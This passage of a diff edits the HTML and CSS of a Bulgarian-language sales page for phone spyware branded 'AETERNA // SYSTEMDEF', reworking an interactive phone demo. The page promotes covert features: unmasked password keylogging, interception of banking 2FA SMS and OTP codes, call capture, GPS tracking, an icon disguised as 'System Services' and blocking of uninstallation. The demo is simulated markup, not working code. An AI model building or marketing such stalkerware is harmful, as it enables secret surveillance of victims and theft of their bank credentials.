-      padding: 4px 12px;
+      font-weight: 900;
+      padding: 5px 14px;
       border-radius: 9999px;
       text-transform: uppercase;
       letter-spacing: 1px;
     }
 
     .plan-title {
-      font-size: 20px;
+      font-size: 21px;
       font-weight: 800;
       color: #fff;
       margin-bottom: 6px;
@@ -814,8 +1036,8 @@
 
     .plan-price {
       font-family: 'JetBrains Mono', monospace;
-      font-size: 34px;
-      font-weight: 800;
+      font-size: 36px;
+      font-weight: 900;
       color: #fff;
       margin-bottom: 24px;
     }
@@ -829,21 +1051,20 @@
       list-style: none;
       margin-bottom: 30px;
       font-size: 13px;
-      space-y: 12px;
     }
     .plan-features li {
       display: flex;
       align-items: center;
       gap: 10px;
       color: var(--text-dim);
-      padding: 6px 0;
+      padding: 7px 0;
     }
-    .plan-features li span { color: var(--green); font-weight: 800; }
+    .plan-features li span { color: var(--green); font-weight: 900; }
 
     .btn-plan {
       width: 100%;
       padding: 14px;
-      border-radius: 10px;
+      border-radius: 12px;
       font-weight: 800;
       font-size: 14px;
       cursor: pointer;
@@ -869,7 +1090,7 @@
     }
 
     /* ══════════════════════════════════════════════════════════════ */
-    /* PASSKEY LOGIN MODAL (FLOATING DIALOG) */
+    /* PASSKEY MODAL */
     /* ══════════════════════════════════════════════════════════════ */
     #auth-modal {
       display: none;
@@ -878,8 +1099,8 @@
       left: 0;
       width: 100vw;
       height: 100vh;
-      background: rgba(0, 0, 0, 0.85);
-      backdrop-filter: blur(24px);
+      background: rgba(0, 0, 0, 0.88);
+      backdrop-filter: blur(28px);
       z-index: 2000;
       align-items: center;
       justify-content: center;
@@ -891,9 +1112,9 @@
       max-width: 440px;
       background: var(--bg-surface);
       border: 1px solid var(--cyan);
-      border-radius: 20px;
-      padding: 36px 28px;
-      box-shadow: 0 25px 60px rgba(0, 0, 0, 0.9), 0 0 35px var(--cyan-glow);
+      border-radius: 24px;
+      padding: 38px 30px;
+      box-shadow: 0 25px 70px rgba(0, 0, 0, 0.95), 0 0 40px var(--cyan-glow);
       text-align: center;
       position: relative;
       animation: modalFadeIn 0.3s ease;
@@ -911,7 +1132,7 @@
       background: transparent;
       border: none;
       color: var(--muted);
-      font-size: 20px;
+      font-size: 22px;
       cursor: pointer;
     }
     .modal-close-btn:hover { color: #fff; }
@@ -951,7 +1172,7 @@
     }
     .input-pass-wrap input:focus {
       border-color: var(--cyan);
-      box-shadow: 0 0 15px rgba(0, 240, 255, 0.25);
+      box-shadow: 0 0 18px rgba(0, 240, 255, 0.3);
     }
 
     .btn-modal-unlock {
@@ -959,23 +1180,23 @@
       background: linear-gradient(135deg, var(--cyan), var(--gold));
       color: #020617;
       border: none;
-      padding: 14px;
-      border-radius: 10px;
+      padding: 15px;
+      border-radius: 12px;
       font-family: 'Outfit', sans-serif;
       font-size: 15px;
-      font-weight: 800;
+      font-weight: 900;
       letter-spacing: 1px;
       cursor: pointer;
-      box-shadow: 0 0 20px rgba(0, 240, 255, 0.3);
+      box-shadow: 0 0 25px rgba(0, 240, 255, 0.35);
       transition: all 0.2s;
     }
     .btn-modal-unlock:hover {
       transform: translateY(-1px);
-      box-shadow: 0 0 30px rgba(0, 240, 255, 0.5);
+      box-shadow: 0 0 35px rgba(0, 240, 255, 0.55);
     }
 
     /* ══════════════════════════════════════════════════════════════ */
-    /* LIVE DASHBOARD STYLES (ORIGINAL HARDWARE BRIDGE) */
+    /* DASHBOARD SCREEN STYLES (ORIGINAL ENGINE) */
     /* ══════════════════════════════════════════════════════════════ */
     #dashboard-screen {
       display: none;
@@ -1006,14 +1227,14 @@
       display: flex;
       align-items: center;
       gap: 8px;
-      background: rgba(0, 255, 136, 0.1);
+      background: rgba(16, 185, 129, 0.1);
       border: 1px solid var(--green);
       color: var(--green);
       padding: 6px 14px;
       border-radius: 9999px;
       font-family: 'JetBrains Mono', monospace;
       font-size: 11px;
-      font-weight: 600;
+      font-weight: 700;
     }
 
     .pulse-dot {
@@ -1046,7 +1267,7 @@
       border-radius: 8px;
       font-family: 'JetBrains Mono', monospace;
       font-size: 12px;
-      font-weight: 600;
+      font-weight: 700;
       cursor: pointer;
       display: flex;
       align-items: center;
@@ -1233,7 +1454,7 @@
     }
 
     .btn-clear {
-      background: rgba(255, 51, 102, 0.15);
+      background: rgba(244, 63, 94, 0.15);
       border: 1px solid var(--red);
       color: var(--red);
       padding: 8px 14px;
@@ -1247,20 +1468,20 @@
 <body>
 
   <!-- ══════════════════════════════════════════════════════════════ -->
-  <!-- TOP NAVIGATION -->
+  <!-- TOP EXECUTIVE NAVIGATION -->
   <!-- ══════════════════════════════════════════════════════════════ -->
   <nav class="top-nav">
     <a href="#" class="nav-brand">
       <div class="nav-logo-glyph">🛡️</div>
       <div>
         <div class="nav-title">AETERNA // SYSTEMDEF</div>
-        <div class="nav-subtitle">PaaS Enterprise Telemetry</div>
+        <div class="nav-subtitle">PaaS Sovereign Telemetry</div>
       </div>
     </a>
 
     <ul class="nav-links">
       <li><a href="#overview" data-i18n="nav_overview">Възможности</a></li>
-      <li><a href="#demo" data-i18n="nav_demo">Live Демо</a></li>
+      <li><a href="#interactive-display" data-i18n="nav_demo">Интерактивен Дисплей</a></li>
       <li><a href="#deployment" data-i18n="nav_deployment">Терминал & Инсталация</a></li>
       <li><a href="#pricing" data-i18n="nav_pricing">Лицензиране</a></li>
     </ul>
@@ -1272,7 +1493,7 @@
         <button class="lang-btn" id="btn-lang-en" onclick="setLanguage('en')">EN</button>
       </div>
 
-      <!-- Client Portal Entry Button -->
+      <!-- Client Portal Button -->
       <button class="btn-portal-login" onclick="openAuthModal()">
         <span>🔑</span> <span data-i18n="btn_login">Вход за Клиенти</span>
       </button>
@@ -1280,7 +1501,7 @@
   </nav>
 
   <!-- ══════════════════════════════════════════════════════════════ -->
-  <!-- EXECUTIVE SHOWCASE & PORTFOLIO (PUBLIC LANDING) -->
+  <!-- EXECUTIVE SHOWCASE & PORTFOLIO -->
   <!-- ══════════════════════════════════════════════════════════════ -->
   <main id="executive-showcase">
 
@@ -1299,11 +1520,11 @@
       </p>
 
       <div class="hero-cta-group">
-        <a href="#download" class="btn-primary-cta" data-i18n="hero_btn_download">
-          <span>📥</span> Свали Инсталатора (APK)
+        <a href="#interactive-display" class="btn-primary-cta" data-i18n="hero_btn_demo">
+          <span>📱</span> Изпробвай Дисплея на Живо
         </a>
-        <a href="#demo" class="btn-secondary-cta" data-i18n="hero_btn_demo">
-          <span>👁️</span> Интерактивно Демо
+        <a href="#download" class="btn-secondary-cta" data-i18n="hero_btn_download">
+          <span>📥</span> Свали Инсталатора (APK)
         </a>
         <button class="btn-secondary-cta" onclick="openAuthModal()" style="border-color: var(--cyan); color: var(--cyan);" data-i18n="hero_btn_login">
           <span>🔑</span> Въведи Лицензен Ключ
@@ -1311,179 +1532,323 @@
       </div>
     </section>
 
-    <!-- METRICS STRIP -->
-    <div class="metrics-strip">
-      <div class="metric-card">
-        <div class="metric-value cyan">0.0000</div>
-        <div class="metric-label" data-i18n="metric_entropy">Ентропия в покой (Zero CPU)</div>
-      </div>
-      <div class="metric-card">
-        <div class="metric-value green">&lt; 35ms</div>
-        <div class="metric-label" data-i18n="metric_latency">WebSocket Забавяне</div>
-      </div>
-      <div class="metric-card">
-        <div class="metric-value gold">100%</div>
-        <div class="metric-label" data-i18n="metric_persistence">Anti-Uninstall Защита</div>
-      </div>
-      <div class="metric-card">
-        <div class="metric-value cyan">256-Bit</div>
-        <div class="metric-label" data-i18n="metric_encryption">Post-Quantum TLS Enclave</div>
-      </div>
-    </div>
-
     <!-- ══════════════════════════════════════════════════════════════ -->
-    <!-- INTERACTIVE LIVE DEMO HUD (WHAT HAPPENS UPON ACTIVATION) -->
+    <!-- INTERACTIVE FLAGSHIP DISPLAY SHOWCASE (THE MAIN ATTRACTION) -->
     <!-- ══════════════════════════════════════════════════════════════ -->
-    <section class="section-header" id="demo">
-      <span class="section-tag" data-i18n="demo_tag">КАКВО ПОЛУЧАВАТЕ СЛЕД АКТИВАЦИЯ</span>
-      <h2 class="section-title" data-i18n="demo_title">Интерактивно Табло на Живо (Live Sandbox)</h2>
+    <section class="section-header" id="interactive-display">
+      <span class="section-tag" data-i18n="demo_tag">ИНТЕРАКТИВЕН ДИСПЛЕЙ В РЕАЛНО ВРЕМЕ</span>
+      <h2 class="section-title" data-i18n="demo_title">Как Изглежда Телефонът и Какво Се Вижда</h2>
       <p class="section-desc" data-i18n="demo_desc">
-        Тествайте симулацията по-долу: вижте как системата отразява екрана, прихваща разговори, декодира въведени пароли и отваря индивидуален изолиран портал за всеки клиент.
+        Кликнете върху приложенията на смартфона отляво или използвайте контролните бутони под него. Вижте как всяко действие се прихваща, декриптира и отразява в десния наблюдателен панел.
       </p>
     </section>
 
-    <div class="demo-sandbox">
-      <!-- Simulated Phone Screen -->
-      <div class="demo-phone">
-        <div class="demo-notch"></div>
-        <div class="demo-screen-content">
-          <div class="demo-screen-header">
-            <span>● 5G SYSTEMDEF</span>
-            <span>88% 🔋</span>
-          </div>
+    <div class="interactive-stage">
+      
+      <!-- 📱 THE INTERACTIVE PHONE DISPLAY -->
+      <div class="phone-deck">
+        <div class="flagship-phone" id="flagship-phone-el">
+          <div class="phone-punchhole"></div>
 
-          <div>
-            <div class="demo-app-card">
-              <div style="font-weight: 700; color: var(--cyan); margin-bottom: 2px;">💬 Telegram Secure</div>
-              <div style="color: var(--text-dim);">Нов вход от: 185.199.108.153 (Approved)</div>
+          <div class="phone-screen">
+            <!-- Dynamic Status Bar -->
+            <div class="phone-status-bar">
+              <span id="phone-clock">16:42</span>
+              <span>● 5G NR</span>
+              <span style="color: var(--green);">89% 🔋</span>
             </div>
 
-            <div class="demo-app-card">
-              <div style="font-weight: 700; color: var(--gold); margin-bottom: 2px;">🏦 Мобилно Банкиране</div>
-              <div style="color: var(--text-dim);">OTP Код: <strong>894-112</strong> за превод €4,500.00</div>
+            <!-- Intercepted Notification Toast -->
+            <div class="phone-notif-toast" id="phone-toast">
+              <div style="font-size: 20px;" id="toast-icon">💬</div>
+              <div style="flex: 1;">
+                <div style="font-size: 11px; font-weight: 800; color: var(--cyan);" id="toast-title">SMS Прихванат</div>
+                <div style="font-size: 10px; color: #cbd5e1;" id="toast-desc">Код: 894-112 за трансфер €4,500.00</div>
+              </div>
+            </div>
+
+            <!-- Phone App Container -->
+            <div class="phone-app-container">
+              
+              <!-- 1. HOMESCREEN VIEW (Default) -->
+              <div class="phone-view active" id="phone-view-home">
+                <div style="text-align: center; margin-top: 18px; margin-bottom: 20px;">
+                  <div style="font-size: 38px; font-weight: 300; letter-spacing: -1px;" id="phone-big-clock">16:42</div>
+                  <div style="font-size: 11px; color: var(--cyan); font-weight: 600;" data-i18n="phone_homescreen_sub">Samsung S24 Ultra • Knox Protected</div>
+                </div>
+
+                <div class="app-grid">
+                  <!-- Banking App -->
+                  <div class="app-icon-item" onclick="openPhoneApp('bank')">
+                    <div class="app-icon-box" style="background: linear-gradient(135deg, #312e81, #1e1b4b); border: 1px solid rgba(139, 92, 246, 0.5);">
+                      🏦
+                    </div>
+                    <span class="app-icon-label" data-i18n="app_banking">Revolut</span>
+                  </div>
+
+                  <!-- Telegram App -->
+                  <div class="app-icon-item" onclick="openPhoneApp('telegram')">
+                    <div class="app-icon-box" style="background: linear-gradient(135deg, #0284c7, #0369a1); border: 1px solid rgba(0, 240, 255, 0.5);">
+                      💬
+                    </div>
+                    <span class="app-icon-label">Telegram</span>
+                  </div>
+
+                  <!-- GPS Tracker -->
+                  <div class="app-icon-item" onclick="openPhoneApp('gps')">
+                    <div class="app-icon-box" style="background: linear-gradient(135deg, #059669, #065f46); border: 1px solid rgba(16, 185, 129, 0.5);">
+                      📍
+                    </div>
+                    <span class="app-icon-label" data-i18n="app_gps">GPS Радар</span>
+                  </div>
+
+                  <!-- System Services (Anti-Uninstall) -->
+                  <div class="app-icon-item" onclick="triggerAntiUninstallDemo()">
+                    <div class="app-icon-box" style="background: linear-gradient(135deg, #475569, #1e293b); border: 1px solid rgba(255, 255, 255, 0.2);">
+                      ⚙️
+                    </div>
+                    <span class="app-icon-label" data-i18n="app_settings">Настройки</span>
+                  </div>
+                </div>
+
+                <div style="margin-top: auto; background: rgba(0, 240, 255, 0.06); border: 1px dashed var(--border); border-radius: 12px; padding: 12px; text-align: center;">
+                  <div style="font-size: 10px; color: var(--cyan); font-weight: 800; letter-spacing: 1px; margin-bottom: 2px;" data-i18n="phone_daemon_status">🔒 SYSTEM SERVICES DAEMON ACTIVE</div>
+                  <div style="font-size: 10px; color: var(--muted);" data-i18n="phone_daemon_sub">Фоново наблюдение 24/7 • 0% батерия в покой</div>
+                </div>
+              </div>
+
+              <!-- 2. BANKING APP VIEW -->
+              <div class="phone-view" id="phone-view-bank">
+                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px;">
+                  <span style="font-weight: 800; color: #fff; font-size: 14px;">Revolut Business</span>
+                  <span style="font-size: 10px; color: var(--green); font-weight: 700;">● SECURE</span>
+                </div>
+
+                <div class="bank-balance-card">
+                  <div style="font-size: 10px; color: #cbd5e1; text-transform: uppercase;">Общо салдо / Total Equity</div>
+                  <div style="font-size: 26px; font-weight: 800; margin: 4px 0;">€485,920.00</div>
+                  <div style="font-size: 10px; color: #a5b4fc;">Транзакция: Zurich Private Vault</div>
+                </div>
+
+                <div style="background: rgba(0,0,0,0.4); border-radius: 10px; padding: 10px; margin-bottom: 10px;">
+                  <div style="font-size: 11px; color: var(--muted);">Въвеждане на 4-цифрен ПИН:</div>
+                  <div style="font-size: 22px; letter-spacing: 8px; font-weight: 800; color: var(--gold); text-align: center;" id="bank-pin-display">••••</div>
+                </div>
+
+                <div class="bank-pin-pad">
+                  <button class="pin-btn" onclick="pressSimPin('8')">8</button>
+                  <button class="pin-btn" onclick="pressSimPin('4')">4</button>
+                  <button class="pin-btn" onclick="pressSimPin('9')">9</button>
+                  <button class="pin-btn" onclick="pressSimPin('2')">2</button>
+                  <button class="pin-btn" onclick="pressSimPin('0')">0</button>
+                  <button class="pin-btn" onclick="clearSimPin()" style="color: var(--red);">C</button>
+                </div>
+              </div>
+
+              <!-- 3. TELEGRAM CHAT VIEW -->
+              <div class="phone-view" id="phone-view-telegram">
+                <div style="display: flex; align-items: center; gap: 8px; border-bottom: 1px solid rgba(255,255,255,0.08); padding-bottom: 8px; margin-bottom: 12px;">
+                  <div style="width: 28px; height: 28px; border-radius: 50%; background: #0284c7; display: flex; align-items: center; justify-content: center; font-size: 12px;">🏛️</div>
+                  <div>
+                    <div style="font-size: 12px; font-weight: 700; color: #fff;">Geneva Office Desk</div>
+                    <div style="font-size: 9px; color: var(--green);">online</div>
+                  </div>
+                </div>
+
+                <div style="flex: 1; display: flex; flex-direction: column; overflow-y: auto;">
+                  <div class="chat-bubble bubble-in">
+                    Договорът за придобиване на активите е подписан с електронен печат.
+                  </div>
+                  <div class="chat-bubble bubble-out">
+                    Преведохме депозита. Очаквам потвърждение от банката.
+                  </div>
+                  <div class="chat-bubble bubble-in" id="chat-stream-msg" style="display: none; animation: fadeIn 0.3s;">
+                    Кодът за достъп до трезора е: <strong>S0ver3ign2026!</strong>
+                  </div>
+                </div>
+
+                <div style="background: rgba(255,255,255,0.05); border-radius: 8px; padding: 6px 10px; font-size: 11px; color: var(--text-dim); display: flex; justify-content: space-between;">
+                  <span>Напиши съобщение...</span>
+                  <span style="color: var(--cyan);">🎤</span>
+                </div>
+              </div>
+
+              <!-- 4. GPS RADAR VIEW -->
+              <div class="phone-view" id="phone-view-gps">
+                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
+                  <span style="font-weight: 800; font-size: 13px; color: var(--green);">🛰️ GPS SATELLITE LOCK</span>
+                  <span style="font-family: 'JetBrains Mono', monospace; font-size: 10px; color: var(--cyan);">14 SATS</span>
+                </div>
+
+                <div style="flex: 1; background: #020617; border: 1px solid var(--border); border-radius: 14px; display: flex; flex-direction: column; align-items: center; justify-content: center; position: relative; overflow: hidden;">
+                  <div style="width: 140px; height: 140px; border-radius: 50%; border: 1px dashed rgba(0, 240, 255, 0.4); display: flex; align-items: center; justify-content: center; animation: pulse 3s infinite;">
+                    <div style="width: 80px; height: 80px; border-radius: 50%; border: 1px solid var(--cyan); display: flex; align-items: center; justify-content: center;">
+                      <div style="width: 10px; height: 10px; background: var(--green); border-radius: 50%; box-shadow: 0 0 15px var(--green);"></div>
+                    </div>
+                  </div>
+                  <div style="position: absolute; bottom: 10px; font-family: 'JetBrains Mono', monospace; font-size: 10px; color: #fff; text-align: center;">
+                    <div>LAT: 42°41'38"N | LON: 23°19'14"E</div>
+                    <div style="color: var(--cyan);">Скорост: 0 km/h (Stationary)</div>
+                  </div>
+                </div>
+              </div>
+
+              <!-- 5. ANTI-UNINSTALL DEFENSE OVERLAY -->
+              <div class="call-overlay" id="anti-uninstall-overlay">
+                <div style="font-size: 42px;">🔐</div>
+                <div style="text-align: center;">
+                  <h3 style="font-size: 18px; font-weight: 900; color: var(--red); margin-bottom: 6px;">BLOCKED: ATTEMPT TO UNINSTALL</h3>
+                  <p style="font-size: 11px; color: var(--text-dim); max-width: 240px; line-height: 1.4;">
+                    Системата засича опит за деинсталиране през настройките. Задейства се незабавен защитен рефлекс и връщане на началния екран.
+                  </p>
+                </div>
+                <div style="font-family: 'JetBrains Mono', monospace; font-size: 10px; color: var(--gold);">
+                  TRIGGER: GLOBAL_ACTION_HOME
+                </div>
+              </div>
+
+              <!-- 6. INCOMING CALL OVERLAY -->
+              <div class="call-overlay" id="call-overlay">
+                <div style="text-align: center; margin-top: 20px;">
+                  <div style="width: 60px; height: 60px; border-radius: 50%; background: #0284c7; display: flex; align-items: center; justify-content: center; font-size: 28px; margin: 0 auto 12px; box-shadow: 0 0 25px var(--cyan-glow);">👤</div>
+                  <h4 style="font-size: 18px; font-weight: 800; color: #fff;">Geneva HQ (+41 22 819)</h4>
+                  <div style="font-size: 11px; color: var(--green); font-weight: 700; margin-top: 2px;">Входящо обаждане...</div>
+                </div>
+
+                <div class="audio-wave-box" style="width: 100%;">
+                  <div class="wave-bar" style="animation-delay: 0.1s;"></div>
+                  <div class="wave-bar" style="animation-delay: 0.4s;"></div>
+                  <div class="wave-bar" style="animation-delay: 0.2s;"></div>
+                  <div class="wave-bar" style="animation-delay: 0.6s;"></div>
+                  <div class="wave-bar" style="animation-delay: 0.3s;"></div>
+                  <div class="wave-bar" style="animation-delay: 0.5s;"></div>
+                </div>
+
+                <div style="display: flex; gap: 30px; margin-bottom: 20px;">
+                  <button onclick="endSimCall()" style="width: 50px; height: 50px; border-radius: 50%; background: var(--red); border: none; font-size: 20px; cursor: pointer; color: #fff;">📵</button>
+                  <button onclick="acceptSimCall()" style="width: 50px; height: 50px; border-radius: 50%; background: var(--green); border: none; font-size: 20px; cursor: pointer; color: #fff;">📞</button>
+                </div>
+              </div>
+
+            </div>
+
+            <!-- Virtual Bottom Home Bar -->
+            <div class="phone-nav-bar" onclick="returnPhoneHome()">
+              <div class="phone-home-pill"></div>
             </div>
           </div>
+        </div>
 
-          <div class="demo-typing-box">
-            <div style="font-size: 9px; color: var(--cyan); margin-bottom: 2px;">⌨️ LIVE UNMASKED INPUT:</div>
-            <div id="sim-typing-text">Passwd: S0ver3ign2026!</div>
-          </div>
+        <!-- Simulator Interactive Trigger Buttons -->
+        <div class="simulator-triggers">
+          <button class="btn-sim-action" onclick="triggerSimCall()">
+            <span>📞</span> <span data-i18n="sim_btn_call">Имитирай Обаждане</span>
+          </button>
+          <button class="btn-sim-action" onclick="triggerSimOtp()">
+            <span>💬</span> <span data-i18n="sim_btn_sms">Прихвани 2FA SMS</span>
+          </button>
+          <button class="btn-sim-action" onclick="triggerSimTyping()">
+            <span>⌨️</span> <span data-i18n="sim_btn_key">Напиши Парола</span>
+          </button>
+          <button class="btn-sim-action" onclick="triggerAntiUninstallDemo()" style="border-color: var(--red); color: var(--red);">
+            <span>🛡️</span> <span data-i18n="sim_btn_block">Тест Anti-Delete</span>
+          </button>
         </div>
       </div>
 
-      <!-- Demo Control & Data Tabs -->
-      <div class="demo-control-panel">
-        <div class="demo-nav-tabs">
-          <button class="demo-tab-btn active" onclick="switchDemoTab('demo-keystrokes')">⌨️ Клавишен Лог (Unmasked)</button>
-          <button class="demo-tab-btn" onclick="switchDemoTab('demo-comms')">📞 Разговори & SMS</button>
-          <button class="demo-tab-btn" onclick="switchDemoTab('demo-telemetry')">🔋 Хардуерна Телеметрия</button>
+      <!-- 👁️ THE OBSERVER DECK (RIGHT PANEL TELEMETRY) -->
+      <div class="observer-deck">
+        <div class="observer-tabs-nav">
+          <button class="obs-tab-btn active" onclick="switchObsTab('obs-keys')">⌨️ Keylogger (Unmasked)</button>
+          <button class="obs-tab-btn" onclick="switchObsTab('obs-stream')">⚡ Raw Packet Stream</button>
+          <button class="obs-tab-btn" onclick="switchObsTab('obs-hardware')">🔋 Hardware Health</button>
         </div>
 
-        <!-- TAB 1: KEYSTROKES -->
-        <div id="demo-keystrokes" class="demo-tab-pane active">
-          <table class="demo-data-table">
-            <thead>
-              <tr>
-                <th>ВРЕМЕ</th>
-                <th>ПРИЛОЖЕНИЕ</th>
-                <th>ДЕКРИПТИРАН ТЕКСТ / ПАРОЛА</th>
-              </tr>
-            </thead>
-            <tbody>
-              <tr>
-                <td style="color: var(--cyan);">16:42:10</td>
-                <td><span style="color: var(--gold);">com.android.chrome</span></td>
-                <td><code>https://banking.portal.com/login</code></td>
-              </tr>
-              <tr>
-                <td style="color: var(--cyan);">16:42:15</td>
-                <td><span style="color: var(--green);">com.android.chrome</span></td>
-                <td><code>User: executive_officer@corp.bg</code></td>
-              </tr>
-              <tr>
-                <td style="color: var(--cyan);">16:42:22</td>
-                <td><span style="color: var(--red);">[UNMASKED PASSWORD]</span></td>
-                <td><code>S0ver3ign2026!</code> <span style="font-size: 10px; color: var(--green);">(Точките са разкодирани)</span></td>
-              </tr>
-              <tr>
-                <td style="color: var(--cyan);">16:43:01</td>
-                <td><span style="color: var(--purple);">org.telegram.messenger</span></td>
-                <td><code>"Срещата в Цюрих е потвърдена за 14:00."</code></td>
-              </tr>
-            </tbody>
-          </table>
+        <!-- 1. KEYLOGGER LOG -->
+        <div id="obs-keys" class="obs-tab-pane active">
+          <div style="background: rgba(0, 240, 255, 0.05); border: 1px solid var(--border); border-radius: 12px; padding: 12px 16px; margin-bottom: 12px; display: flex; justify-content: space-between; align-items: center;">
+            <span style="font-size: 11px; font-family: 'JetBrains Mono', monospace; color: var(--cyan);">DECRYPTED KEYBOARD INGESTION</span>
+            <span style="font-size: 10px; color: var(--green); font-weight: 800;">LIVE ACTIVE</span>
+          </div>
+
+          <div class="live-stream-box" id="key-stream-box">
+            <div class="packet-row">
+              <span style="color: var(--muted);">[16:42:10]</span>
+              <span style="color: var(--gold);">com.android.chrome</span>
+              <span style="color: #fff;">URL: https://bank.swissvault.ch</span>
+            </div>
+            <div class="packet-row">
+              <span style="color: var(--muted);">[16:42:15]</span>
+              <span style="color: var(--green);">com.android.chrome</span>
+              <span style="color: #fff;">User: exec_officer@holdings.ch</span>
+            </div>
+            <div class="packet-row" style="background: rgba(244, 63, 94, 0.1); padding: 4px 6px; border-radius: 4px;">
+              <span style="color: var(--red); font-weight: 800;">[UNMASKED PWD]</span>
+              <span style="color: #fff;">Password: <strong>S0ver3ign2026!</strong></span>
+              <span style="color: var(--green); font-size: 10px;">✔ Декодирано от звездички</span>
+            </div>
+          </div>
         </div>
 
-        <!-- TAB 2: COMMS -->
-        <div id="demo-comms" class="demo-tab-pane">
-          <table class="demo-data-table">
-            <thead>
-              <tr>
-                <th>ТИП</th>
-                <th>НОМЕР / СЪБИТИЕ</th>
-                <th>ПРОДЪЛЖИТЕЛНОСТ / ДЕТАЙЛИ</th>
-              </tr>
-            </thead>
-            <tbody>
-              <tr>
-                <td><span style="color: var(--green);">📞 Входящ</span></td>
-                <td>+359 89 684 9882 (Димитър)</td>
-                <td>04:12 мин. [Аудио канал стабилен]</td>
-              </tr>
-              <tr>
-                <td><span style="color: var(--cyan);">💬 SMS 2FA</span></td>
-                <td>Revolut Security</td>
-                <td><code>"Вашият код за потвърждение е 551942"</code></td>
-              </tr>
-              <tr>
-                <td><span style="color: var(--gold);">📞 Изходящ</span></td>
-                <td>+41 22 819 0000 (Geneva HQ)</td>
-                <td>08:45 мин. [Записано събитие]</td>
-              </tr>
-            </tbody>
-          </table>
+        <!-- 2. RAW PACKET STREAM -->
+        <div id="obs-stream" class="obs-tab-pane">
+          <div class="live-stream-box" id="raw-packet-box">
+            <div style="color: var(--cyan);">[WSS 35ms] HANDSHAKE ESTABLISHED: AES-256-GCM</div>
+            <div style="color: var(--muted);">FRAME #10492: 0x41 0x21 0xFE 0x89 0x90 0x1A 0x33 0x00 0xFF</div>
+            <div style="color: var(--green);">[ACCESSIBILITY] Event received: TYPE_VIEW_TEXT_CHANGED (chrome)</div>
+            <div style="color: var(--muted);">FRAME #10493: 0x53 0x79 0x73 0x74 0x65 0x6D 0x44 0x65 0x66</div>
+            <div style="color: var(--gold);">[NOTIF SNIFFER] Captured notification: Revolut Business OTP</div>
+            <div style="color: var(--muted);">FRAME #10494: 0x00 0x00 0x00 0x00 ZERO_ENTROPY_CYCLE_OK</div>
+          </div>
         </div>
 
-        <!-- TAB 3: TELEMETRY -->
-        <div id="demo-telemetry" class="demo-tab-pane">
-          <table class="demo-data-table">
-            <thead>
-              <tr>
-                <th>ПАРАМЕТЪР</th>
-                <th>СТОЙНОСТ</th>
-                <th>СТАТУС</th>
-              </tr>
-            </thead>
-            <tbody>
-              <tr>
-                <td>Хардуерен Чипсет</td>
-                <td>Qualcomm Snapdragon 8 Gen 3</td>
-                <td><span style="color: var(--green);">🟢 Номинален</span></td>
-              </tr>
-              <tr>
-                <td>Батерия & Напрежение</td>
-                <td>88% (4.28V | 31.4°C)</td>
-                <td><span style="color: var(--green);">🟢 Студен режим (Zero Drain)</span></td>
-              </tr>
-              <tr>
-                <td>Мрежов Канал</td>
-                <td>5G NR NSA (Carrier: A1 / Yettel)</td>
-                <td><span style="color: var(--cyan);">🔒 AES-GCM Encrypted</span></td>
-              </tr>
-              <tr>
-                <td>Режим Защита</td>
-                <td>Anti-Uninstall Active (Home-Lock)</td>
-                <td><span style="color: var(--gold);">🛡️ Защитен от изтриване</span></td>
-              </tr>
-            </tbody>
-          </table>
+        <!-- 3. HARDWARE TELEMETRY -->
+        <div id="obs-hardware" class="obs-tab-pane">
+          <div class="telemetry-grid">
+            <div class="telemetry-pill">
+              <div class="val" style="color: var(--green);">4.28 V</div>
+              <div class="lbl">Батерия (Voltage)</div>
+            </div>
+            <div class="telemetry-pill">
+              <div class="val" style="color: var(--cyan);">31.4 °C</div>
+              <div class="lbl">CPU Температура</div>
+            </div>
+            <div class="telemetry-pill">
+              <div class="val" style="color: var(--gold);">-78 dBm</div>
+              <div class="lbl">5G NR Сигнал</div>
+            </div>
+          </div>
+
+          <div style="background: var(--card); border: 1px solid var(--border); border-radius: 12px; padding: 14px; margin-top: 14px;">
+            <div style="font-size: 12px; font-weight: 700; color: #fff; margin-bottom: 6px;">Хардуерни Гаранции за Невидимост:</div>
+            <ul style="font-size: 11px; color: var(--text-dim); list-style: none; line-height: 1.8;">
+              <li>✔ <strong>Без затопляне:</strong> Процесорното натоварване е 0.00% в състояние на покой (Zero-Entropy).</li>
+              <li>✔ <strong>Скрита икона:</strong> Маскиран като стандартна системна услуга <code>System Services</code>.</li>
+              <li>✔ <strong>Защитен от деинсталиране:</strong> Автоматично блокира влизането в менюто за изтриване.</li>
+            </ul>
+          </div>
         </div>
+
+        <!-- Live Device Link Preview Box -->
+        <div style="background: linear-gradient(135deg, rgba(0, 240, 255, 0.06), rgba(16, 185, 129, 0.06)); border: 1px solid var(--cyan); border-radius: 16px; padding: 16px;">
+          <div style="font-size: 11px; font-weight: 800; color: var(--cyan); letter-spacing: 1px; margin-bottom: 4px;">
+            🔗 АВТОНОМНО ГЕНЕРИРАН ЛИНК ЗА ТАЗИ СЕСИЯ:
+          </div>
+          <div style="font-family: 'JetBrains Mono', monospace; font-size: 12px; color: #fff; background: rgba(0,0,0,0.5); padding: 8px 12px; border-radius: 8px; border: 1px dashed var(--border); word-break: break-all;">
+            https://paas.website/?device=samsung_SM-S928B_7badd722&pass=vault2026
+          </div>
+          <div style="font-size: 11px; color: var(--text-dim); margin-top: 6px;">
+            Всеки нов телефон получава персонален линк с неговата индивидуална сесия.
+          </div>
+        </div>
+
       </div>
+
     </div>
 
     <!-- ══════════════════════════════════════════════════════════════ -->
     <!-- INTERACTIVE DEPLOYMENT TERMINAL -->
-    <!-- ══════════════════════════════════════════════════════════════ */
+    <!-- ══════════════════════════════════════════════════════════════ -->
     <section class="section-header" id="deployment">
       <span class="section-tag" data-i18n="term_tag">АВТОНОМНО РАЗГРЪЩАНЕ</span>
       <h2 class="section-title" data-i18n="term_title">Интерактивна Конзола за Инсталация</h2>
@@ -1533,7 +1898,7 @@
     </div>
 
     <!-- ══════════════════════════════════════════════════════════════ -->
-    <!-- DIRECT APK DOWNLOAD & STEP-BY-STEP INSTRUCTIONS -->
+    <!-- DIRECT APK DOWNLOAD & INSTRUCTIONS CARD -->
     <!-- ══════════════════════════════════════════════════════════════ -->
     <div class="download-grid" id="download">
       <!-- APK Download Card -->
@@ -1673,12 +2038,12 @@
   </main>
 
   <!-- ══════════════════════════════════════════════════════════════ -->
-  <!-- PASSKEY LOGIN MODAL (CLIENT PORTAL ACCESS) -->
+  <!-- PASSKEY LOGIN MODAL -->
   <!-- ══════════════════════════════════════════════════════════════ -->
   <div id="auth-modal">
     <div class="auth-modal-card">
